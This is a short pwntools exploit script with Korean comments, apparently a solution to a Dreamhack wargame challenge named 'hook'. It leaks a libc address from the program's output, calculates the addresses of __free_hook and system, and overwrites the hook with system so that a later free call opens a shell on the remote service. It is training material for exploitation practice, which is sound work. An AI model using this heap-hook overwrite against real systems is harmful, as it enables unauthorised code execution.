from pwn import *

# 1. 셋팅 및 라이브러리 로드
p = remote("host8.dreamhack.games", 15094)
e = ELF('./hook')
libc = ELF('./libc-2.23.so')

# 2. stdout 주소 읽어서 Libc Base leak
p.recvuntil("stdout: ")
stdout_addr = int(p.recvline().strip(), 16)
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']

# 3. 공격 타겟(__free_hook) 및 덮어쓸 값(system) 주소 계산
hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

# 4. Arbitrary Write 페이로드 구성
# size: 8바이트 주소 두 개 들어가야 하니 16 이상 할당
p.sendlineafter("Size: ", b'16')

# payload 구성 논리:
# [ptr]   : 여기에 hook 주소를 써서, *ptr이 hook 주소를 가리키게 함
# [ptr+8] : 여기에 system 주소를 써서, *(ptr+1)이 system 값을 갖게 함
payload = p64(hook) + p64(system)
p.sendlineafter("Data: ", payload)

'''
[C 코드 내부 로직 핵심]
*(long *)*ptr = *(ptr+1);

- *ptr: ptr 위치의 값(hook 주소)을 읽어와서 '대입할 주소'로 인식
- *(ptr+1): ptr+8 위치의 값(system 주소)을 읽어와서 '데이터'로 인식
- 결과: __free_hook 주소에 system 함수 주소가 써짐 (Overwrite 성공)
'''

# 5. free(ptr) 호출 시 system(ptr) 실행 유도
p.interactive()